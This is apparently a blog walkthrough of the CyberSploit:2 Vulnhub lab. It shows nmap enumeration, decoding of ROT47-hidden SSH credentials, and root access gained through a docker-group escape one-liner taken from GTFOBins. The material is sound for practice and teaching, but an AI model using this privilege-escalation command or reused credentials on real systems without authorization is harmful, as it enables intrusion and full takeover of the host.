---
date: 2020-07-30 10:18:54
layout: post
title: "Cybersploit 2 Vulnhub Walkthrough"
subtitle:
description: CyberSploit:2 is a boot2root VM from Vulnhub. This is the second part of the Vulnhub's CyberSploit Series.
image: /assets/img/uploads/cybersploit-2/mech.webp
optimized_image: /assets/img/uploads/cybersploit-2/mech-optimized.webp
category: walkthrough
tags: vulnhub boot2root
author: madhavmehndiratta
paginate: false
keywords: cybersploit 2, cybersploit 2 vulnhub, cybersploit 2 walkthrough, cybersploit 2 vulnhub walkthrough, cybersploit 2 writeup, vulnhub cybersploit walkthrough, cybersploit writeup, infosec articles
---

Today I will be sharing a walkthrough of CyberSploit:2, a boot2root VM available on Vulnhub. This is the second part of the Vulnhub's CyberSploit Series and rated easy. I have added the IP address of the machine to the hosts file, So Let's Begin!

```r
root@kali:~# cat /etc/hosts

127.0.0.1       localhost
127.0.1.1       kali
192.168.1.8     cybersploit2.local
```

## Initial Enumeration and Shell

I started the enumeration by starting a port scan with Nmap, checking for open ports and default scripts.

```r
root@kali:~# nmap -sC -sV -oA nmap/initial cybersploit2.local 

Starting Nmap 7.80 ( https://nmap.org )
Nmap scan report for cybersploit2.local (192.168.1.8)
Host is up (0.00036s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 ad:6d:15:e7:44:e9:7b:b8:59:09:19:5c:bd:d6:6b:10 (RSA)
|   256 d6:d5:b4:5d:8d:f9:5e:6f:3a:31:ad:81:80:34:9b:12 (ECDSA)
|_  256 69:79:4f:8c:90:e9:43:6c:17:f7:31:e8:ff:87:05:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: CyberSploit2
MAC Address: 08:00:27:00:77:54 (Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.62 seconds
```

We have an ssh port open and an Apache 2.4.37 Web Server running on port 80. Looking at the port 80 on our web browser, we see some usernames and passwords along with their handles.

<img src="/assets/img/uploads/cybersploit-2/port80.png">

There is an entry on the 4th number which looks different from others. This is encrypted using some algorithm. Looking at the source code of the page, I found that it is encoded with ROT47.

<img src="/assets/img/uploads/cybersploit-2/source.png">

Next I went to CyberChef to decode the text and found a username <b>shailendra</b> and password <b>cybersploit1.</b>

<img src="/assets/img/uploads/cybersploit-2/cyberchef.png">

I used these credentials to login as user <b>shailendra</b> via ssh.

```r
root@kali:~# ssh shailendra@cybersploit2.local

The authenticity of host 'cybersploit2.local (192.168.1.8)' cant be established.
ECDSA key fingerprint is SHA256:uGYzWYklxeL1iDjLGh5cLrkGjTgqAJfxn3mkDaZ7C7M.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cybersploit2.local,192.168.1.8' (ECDSA) to the list of known hosts.
shailendra@cybersploit2.locals password: 
Last login: Wed Jul 15 12:32:09 2020
[shailendra@localhost ~]$
```
## Root Flag

Inside the home directory of user shailendra, we have a file named <b>hint.txt.</b> This will have the hints for privilege escalation.

```r
[shailendra@localhost ~]$ ls
hint.txt

[shailendra@localhost ~]$ cat hint.txt
docker
```
We have docker as a hint. I saw the <b>id</b> of the user and found that we have <b>docker</b> installed and this user is added to the <b>docker group.</b>

```r
[shailendra@localhost ~]$ id

uid=1001(shailendra) gid=1001(shailendra) groups=1001(shailendra),991(docker) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
```

Looking at the <a href="https://gtfobins.github.io/gtfobins/docker/">GTFO Bins,</a> I found that we can exploit docker and mount the root directory on a docker container using the following command:

```r
[shailendra@localhost ~]$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh

Unable to find image 'alpine:latest' locally
latest: Pulling from library/alpine
df20fa9351a1: Pull complete 
Digest: sha256:185518070891758909c9f839cf4ca393ee977ac378609f700f60a771a2dfe321
Status: Downloaded newer image for alpine:latest
sh-4.4#
```

The exploit was successful and we are root! Now we can read our flag.

```r
sh-4.4# cat /root/flag.txt 
 __    ___   _      __    ___    __   _____  __  
/ /`  / / \ | |\ | / /`_ | |_)  / /\   | |  ( (` 
\_\_, \_\_/ |_| \| \_\_/ |_| \ /_/--\  |_|  _)_) 

 Pwned CyberSploit2 POC

share it with me twitter@cybersploit1

              Thanks ! 
```

That’s it! Thanks for reading. Stay tuned for similar walkthroughs and much more coming up in the near future!
If you have any queries, you can contact me <a href="/contact">here.</a>

NOTE: The awesome artwork used in this article was created by <a href="https://dribbble.com/mattandersondesign">Matt Anderson.</a>
